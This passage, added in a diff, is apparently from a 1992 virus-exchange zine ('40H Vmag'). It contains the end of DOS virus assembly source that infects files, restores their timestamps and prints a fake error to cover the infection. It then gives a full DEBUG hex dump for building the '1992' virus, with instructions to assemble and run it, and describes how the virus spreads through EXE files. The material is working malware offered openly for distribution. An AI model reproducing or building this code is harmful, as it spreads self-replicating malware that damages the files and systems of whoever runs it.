+        mov     ah,3dh                  ; Open it again, to reset it
+        mov     dx,dta+filename
+        mov     al,2
+        int     21h
+        mov     handle,ax               ; Save the handle again
+        call    infect_file             ; Infect the healthy file
+        call    close_file              ; Close down this operation
+        inc     success                 ; Indicate we did something this time
+        dec     files_infected          ; Scratch off another file on agenda
+        jz      exit_virus              ; If we're through, terminate
+        jmp     continue_search         ; Otherwise, try another
+        ret
+close_file:
+        mov     bx,handle               ; Get the file handle off the stack
+        mov     cx,orig_time            ; Get the date stamp
+        mov     dx,orig_date            ; Get the time stamp
+        mov     al,1                    ; Set file date/time sub-service
+        mov     ah,57h                  ; Get/Set file date and time service
+        int     21h                     ; Call DOS
+        mov     bx,handle
+        mov     ah,3eh                  ; Close handle DOS service
+        int     21h
+        mov     cx,orig_attr            ; Get the file's original attribute
+        mov     al,1                    ; Instruct DOS to put it back there
+        mov     dx,dta+filename         ; Feed it the filename
+        mov     ah,43h                  ; Call DOS
+        int     21h
+        ret
+exit_virus:
+        cmp     files_found,6           ; Are at least 6 files infected?
+        jl      print_fake              ; If not, keep a low profile
+        cmp     success,0               ; Did we infect anything?
+        jg      print_fake              ; If so, cover it up
+        mov     ah,09h                  ; Use DOS print string service
+        mov     dx,offset virus_msg1    ; Load the address of the first line
+        int     21h                     ; Print it
+        mov     dx,offset virus_msg2    ; Load the second line
+        int     21h                     ; (etc)
+        mov     dx,offset virus_msg3
+        int     21h
+        mov     dx,offset virus_msg4
+        int     21h
+        jmp     terminate
+print_fake:
+        mov     ah,09h                  ; Use DOS to print fake error message
+        mov     dx,offset fake_msg
+        int     21h
+terminate:
+        mov     ah,4ch                  ; DOS terminate process function
+        int     21h                     ; Call DOS to get out of this program
+
+filler          db       8 dup (90h)    ; Pad out the file length to 666 bytes
+
+main    endp
+code    ends
+        end     main
+
+------------------------------------------------------------------------------
+
+While the virus is no great wonder the simple encryption method is what is
+used by almost all viruses.
+
+                                                                          HR
+40H Vmag Issue 1 Volume 1                                               00005
+
+
+                             - 1992 VIRUS -
+
+
+Heres another for you virus fiends.  Its been labled 1992, the latest in the
+line of viruses brought to you by SKISM.
+
+While the virus is no groundbreaker - the graphic display that is given by
+the virus will go down in history as the first of it's kind.
+
+Copy the below to a file called  1992.USR then execute --
+
+                       DEBUG < 1992.USR
+
+------------------------------------------------------------------------------
+n 1992.com
+e 0100  EB 02 90 02 E8 03 00 E9 E7 05 51 BB 38 01 8A 2F
+e 0110  32 2E 03 01 88 2F 43 81 FB 00 09 7E F1 59 C3 BA
+e 0120  00 01 8B 1E E5 06 53 E8 E0 FF 5B B9 C8 07 B4 40
+e 0130  CD 21 53 E8 D4 FF 5B C3 0D 10 1B 00 08 B1 1B 04
+e 0140  C1 18 22 C6 BD 1B 01 B1 1B 15 B1 1B 01 1A 1B 00
+e 0150  C1 18 04 C6 DB 02 B3 B3 14 18 19 B3 10 DF 22 22
+e 0160  08 B1 1B 01 C1 18 0C C6 C0 18 05 C6 C3 C6 BD 22
+e 0170  22 1A 1B 00 B1 1B 06 02 B3 B3 14 18 1D B3 10 DF
+e 0180  22 08 C2 C6 C6 C0 C6 DB 1B 0C B1 1B 0B B1 22 22
+e 0190  1A 1B 00 B1 1B 01 02 B3 B3 14 18 23 B3 10 DF 1B
+e 01A0  00 08 B1 1B 12 B1 1B 0B C2 C6 C6 1A 1B 00 B1 1B
+e 01B0  00 02 B3 B3 14 18 21 B3 10 DF 22 13 1B 06 0B DC
+e 01C0  10 22 13 22 DC 10 22 13 22 DC 10 22 13 22 DC 10
+e 01D0  22 13 1B 06 DC 10 22 13 22 22 DC 10 22 22 13 22
+e 01E0  22 DC 10 22 22 1A 1B 00 08 B1 22 22 02 B3 B3 14
+e 01F0  18 0A B3 0D 18 1A B3 02 10 DF 14 B3 B3 B3 10 DF
+e 0200  13 22 0B DC 02 10 18 06 B3 13 22 0B DC 22 DC 02
+e 0210  10 B3 B3 13 22 0B DC 02 10 B3 13 22 0B DC 02 10
+e 0220  18 06 B3 13 22 0B DC 22 DC 22 DC 22 DC 02 10 B3
+e 0230  22 1A 1B 00 08 B1 22 22 02 B3 B3 14 18 05 B3 0D
+e 0240  18 1B B3 02 10 DF 22 22 14 B3 10 DF 13 1B 06 0B
+e 0250  DC 10 22 13 22 22 DC 02 10 B3 22 22 13 22 0B DC
+e 0260  02 10 B3 13 1B 06 0B DC 10 22 13 22 DC 02 10 B3
+e 0270  13 22 0B DC 02 10 B3 13 22 0B DC 02 10 B3 22 1A
+e 0280  08 C6 C6 C0 DB 22 22 02 B3 B3 14 18 05 B3 0D 18
+e 0290  0E B3 12 1B 05 14 18 01 B3 02 10 DF 1B 00 08 B1
+e 02A0  22 22 02 B3 B3 B3 13 22 0B DC 02 10 B3 13 22 0B
+e 02B0  DC 22 DC 02 10 B3 22 13 22 0B DC 02 10 B3 22 B3
+e 02C0  B3 B3 13 22 0B DC 02 10 B3 13 22 0B DC 02 10 B3
+e 02D0  22 B3 B3 13 22 0B DC 02 10 B3 22 1A 22 22 08 B1
+e 02E0  1B 00 02 B3 B3 14 18 05 B3 0D 18 0E B3 12 DC D9
+e 02F0  D9 02 14 B3 B3 B0 B0 0D 12 D9 14 B3 B3 B3 02 10
+e 0300  DF 1B 01 08 B1 22 13 1B 06 0B DC 02 10 B3 13 22
+e 0310  0B DC 02 10 B3 13 22 0B DC 02 10 B3 13 22 0B DC
+e 0320  02 10 B3 13 1B 06 0B DC 02 10 B3 13 22 0B DC 02
+e 0330  10 B3 1B 00 13 22 0B DC 02 10 B3 22 1A 22 22 08
+e 0340  B1 1B 00 02 B3 B3 14 18 05 B3 0D 18 0E B3 12 DC
+e 0350  D9 D9 02 14 B3 B3 B3 B0 0D 12 D9 14 B3 B3 02 10
+e 0360  DF 1B 06 08 B1 22 22 02 18 07 B3 22 B3 B3 22 B3
+e 0370  B3 22 B3 B3 22 18 07 B3 22 B3 B3 1B 00 B3 B3 B3
+e 0380  22 1A 22 22 08 B1 1B 00 02 B3 B3 14 18 01 B3 0D
+e 0390  B3 B3 B3 02 B3 0D 18 0E B3 12 DC 18 07 D9 14 B3
+e 03A0  B3 02 10 DF 1B 01 08 D8 C6 DB 1B 18 D8 C6 C6 C6
+e 03B0  BD 22 22 1A 22 22 B1 1B 01 02 B3 B3 14 B3 B3 B3
+e 03C0  0D 18 18 B3 02 10 DF 1B 00 08 C1 18 04 C6 C0 18
+e 03D0  16 C6 DB 1B 00 B1 22 22 1A 22 22 C1 18 01 C6 BD
+e 03E0  02 B3 B3 0D 14 18 1F B3 02 10 DF 22 22 08 B1 1B
+e 03F0  07 16 22 0D 14 56 16 6A 67 22 6F 63 6C 22 75 6A
+e 0400  6D 22 60 70 6D 77 65 6A 76 22 7B 6D 77 22 10 22
+e 0410  22 08 B1 22 22 1A 22 22 B1 1B 01 B1 02 B3 B3 0D
+e 0420  14 18 1E B3 02 10 DF 1B 00 08 B1 1B 01 02 B3 B3
+e 0430  16 22 0D 34 30 30 2E 22 51 69 6B 71 6F 22 4D 6C
+e 0440  67 2E 22 41 63 72 76 6B 63 6C 22 10 22 22 08 B1
+e 0450  22 22 1A 22 22 B1 1B 01 B1 02 B3 B3 0D 14 18 10
+e 0460  B3 02 10 DF 0D 14 18 05 B3 02 10 DF 1B 01 08 B1
+e 0470  1B 01 02 B3 B3 16 22 0D 56 70 6B 72 71 2E 22 63
+e 0480  6C 66 22 51 77 60 2F 58 67 70 6D 22 6C 6D 75 22
+e 0490  10 22 22 08 B1 22 22 1A 22 22 B1 1B 01 B1 02 B3
+e 04A0  B3 0D 14 18 10 B3 02 10 DF 1B 01 08 B1 1B 05 B1
+e 04B0  1B 01 02 B3 B3 16 22 0D 71 6A 63 6C 69 71 22 7B
+e 04C0  6D 77 22 63 65 63 6B 6C 2E 22 22 75 6B 76 6A 22
+e 04D0  10 22 22 08 C2 C6 C6 1A 22 22 B1 1B 01 B1 02 B3
+e 04E0  B3 0D 14 18 10 B3 02 10 DF 1B 01 08 C2 C6 C6 BD
+e 04F0  1B 06 C1 C6 BD 22 22 02 B3 B3 16 22 0D 6A 6B 71
+e 0500  22 6E 63 76 67 71 76 2C 2C 2C 1B 08 10 1B 06 1A
+e 0510  22 22 08 C2 C6 C6 C0 C6 C3 02 B3 B3 0D 14 18 11
+e 0520  B3 02 10 DF 1B 07 08 B1 1B 06 B1 22 B1 22 22 02
+e 0530  18 1A B3 1B 04 1A 1B 06 08 B1 22 22 02 B3 B3 0D
+e 0540  14 18 15 B3 02 10 DF 22 22 08 B1 1B 06 B1 22 C2
+e 0550  18 1E C6 BD 1B 01 1A C6 C6 C0 C6 C6 DB 22 22 02
+e 0560  B3 B3 0D 14 18 14 B3 02 10 DF 1B 00 08 C1 C6 C6
+e 0570  C6 C0 C6 DB 1B 07 17 22 0C 51 69 6B 71 6F 22 33
+e 0580  3B 3B 30 22 2F 22 54 6B 70 77 71 18 01 23 22 10
+e 0590  22 08 C1 18 01 C6 1A 22 22 B1 1B 06 02 B3 B3 0D
+e 05A0  14 18 0A B3 02 10 DF 1B 0A 08 D8 18 04 C6 DB 1B
+e 05B0  00 B1 1B 07 02 B3 B3 17 1B 01 0D 45 67 76 22 63
+e 05C0  22 6E 63 76 67 22 72 63 71 71 23 1B 01 10 22 08
+e 05D0  B1 1B 01 1A D8 C6 DB 1B 00 02 B3 B3 0D 11 18 09
+e 05E0  D9 14 D9 D9 12 DF 10 1B 07 08 B1 1B 08 B1 1B 07
+e 05F0  02 18 1A B3 22 22 08 B1 1B 01 1A B1 22 02 B3 B3
+e 0600  0D 11 18 19 D9 02 10 DF 1B 05 08 B1 1B 11 D8 18
+e 0610  09 C6 DB 1B 01 1A 02 B3 B3 0D 12 18 22 D9 DF 10
+e 0620  1B 06 08 B1 1B 11 B1 1B 12 1A 0D 12 18 21 D9 DF
+e 0630  10 1B 01 08 C2 18 11 C6 DB 1B 12 1A 28 02 28 2C
+e 0640  47 5A 47 02 5E 02 01 3D 3D 3D 3D 3D 3D 3D 3D 22
+e 0650  22 22 11 01 02 02 02 28 D3 EF 48 13 68 7B D4 14
+e 0660  02 02 02 02 46 4D 51 02 22 22 22 22 02 02 02 02
+e 0670  02 01 3D 3D 3D 3D 3D 3D 3D 3D 47 5A 47 05 07 02
+e 0680  23 02 28 D3 EF 48 22 2A 00 23 02 00 02 02 02 56
+e 0690  43 50 45 47 50 2C 47 5A 47 02 02 02 95 32 44 04
+e 06A0  73 04 95 32 02 56 47 4F 52 02 02 02 02 02 02 02
+e 06B0  02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02
+e 06C0  02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02
+e 06D0  02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02
+e 06E0  02 02 02 02 02 07 02 2A 00 23 02 22 02 CF 22 02
+e 06F0  02 BA 02 32 CF 23 3E 01 70 29 B6 2E CF 23 8A 14
+e 0700  01 03 B6 28 CF 23 82 F8 1B 7E 06 3E 07 76 01 E9
+e 0710  77 92 BC 3A 03 BA 02 BA 8C C2 BD 02 02 BB 06 07
+e 0720  EA 07 02 E9 FC EB 88 02 E1 59 89 D5 31 C2 FE AE
+e 0730  3E 22 70 07 A9 E0 FA E9 4E 3E 12 71 05 82 E6 F2
+e 0740  08 E2 E9 F3 3E 1A 76 11 71 1B 2E 12 00 C2 00 C2
+e 0750  00 C2 00 C2 82 E6 8D 08 E2 E9 D8 83 C0 A2 02 89
+e 0760  F8 E9 D0 3E 19 70 05 77 CE 82 F6 82 E9 C5 3E 1B
+e 0770  89 DB AE 88 CA B2 22 76 00 AE 49 30 EF 43 F1 A9
+e 0780  89 C9 4B E2 A8 C1 B8 44 04 B6 18 CF 23 B6 1B CF
+e 0790  23 88 D2 FC C0 B6 45 BC A7 04 CF 23 B8 46 04 B6
+e 07A0  39 CF 23 BB 11 02 B8 3E 04 B6 4C CF 23 3F 10 02
+e 07B0  77 01 E9 53 92 B6 4D CF 23 3F 10 02 76 45 B8 66
+e 07C0  04 B6 39 CF 23 B6 2D CF 23 8E 04 9E 04 8B 1C 9C
+e 07D0  04 B8 73 04 B6 18 CF 23 BB 05 02 B8 3C 04 B6 4C
+e 07E0  CF 23 3F 10 02 77 23 B6 4D CF 23 3F 10 02 77 1A
+e 07F0  B8 46 04 B6 39 CF 23 B6 18 8C 1C 9E 04 89 14 9C
+e 0800  04 CF 23 E9 B2 E9 7B 92 B6 2D CF 23 8E 04 A0 04
+e 0810  8B 1C A2 04 B8 8D 04 B9 73 04 89 45 1A A1 EB 04
+e 0820  89 45 14 A1 E5 04 89 45 17 BA 02 41 CF 23 8B 0C
+e 0830  E9 04 BA 03 41 31 CB CF 23 BA 02 3F CF 23 70 21
+e 0840  A1 E7 04 B6 3D 89 1C E7 04 BB 00 02 B8 EF 04 CF
+e 0850  23 B6 3C 89 1C E7 04 CF 23 89 1C EF 04 83 F9 E9
+e 0860  00 77 0D B6 18 8C 1C A0 04 89 14 A2 04 CF 23 EB
+e 0870  77 FD B8 8D 04 BA 00 3F CF 23 A1 E7 04 EA 9D FA
+e 0880  BA 03 55 89 1C E7 04 89 0C E5 04 89 14 EB 04 CF
+e 0890  23 BA 03 41 89 0C E9 04 B8 8D 04 CF 23 B6 39 B8
+e 08A0  46 04 CF 23 B6 39 B8 A7 04 CF 23 BA 02 4E CF 23
+e 08B0  4F 61 43 64 67 67 22 75 70 6D 76 67 22 55 6A 63
+e 08C0  6E 67 23 23 23 23 23 23 1A 1A 1A 1A 1A 1A 1A 1A
+
+rcx
+7C8
+w
+q
+
+------------------------------------------------------------------------------
+
+The virus only infects systems running DOS 3.0 and up.  It is non-resident
+will only infect disks with more than two directorys.  When the virus is
+run it will seek out the first EXE file in the second directory from the
+root.  Each run after that will begin infection of files following.  The
+virus will jump from directory to directory when executed until it finds
+an uninfected EXE file to nail.
+
+On the last Friday of the month the virus will display a full color, full
+screen message to all.
+
+                                                                          HR
+40H Vmag Issue 1 Volume 1                                               00006
+
+I think this magazine will be monthly, keep looking for it.
+
+Next Issue -
+
+             Spotlight on Vienna
+             Editoral on virus speed
+             Article on Whale and if I can find it Whale source code.
+
+             plus
+
+             More viruses, more source code and more insight...
+
+
+
